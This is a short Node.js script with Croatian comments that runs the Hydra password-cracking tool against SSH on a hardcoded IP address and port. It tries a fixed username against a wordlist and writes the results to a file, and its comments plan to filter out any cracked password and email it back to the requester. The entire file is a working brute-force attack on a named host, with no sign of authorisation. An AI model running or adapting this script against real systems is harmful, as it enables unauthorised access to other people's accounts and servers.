const execSh = require("exec-sh")
const targetIP = "161.53.171.105"
const targetPORT = "10001"
const wordlistPath = "./lists/passList.txt"
const username = "pecelar22"
const resultQuery = `grep -E '${username}'`


execSh(`hydra ${targetIP} ssh -l ${username} -P ${wordlistPath} -s ${targetPORT} -vV -o ./pjepsi.txt -b json
`)
//1.) i 2.) ovo sprema fajl u src
//3.) fajl stavi u bazu za korisnika s tim ID
//4.) iz fajla filtriraj ako je pronadena sifra i posalji kao odgovor na mail jer ove stvari traju
//5.) 


// HYDRA ISPIS DAJE U stdout!!!!

//test uredno zavrsen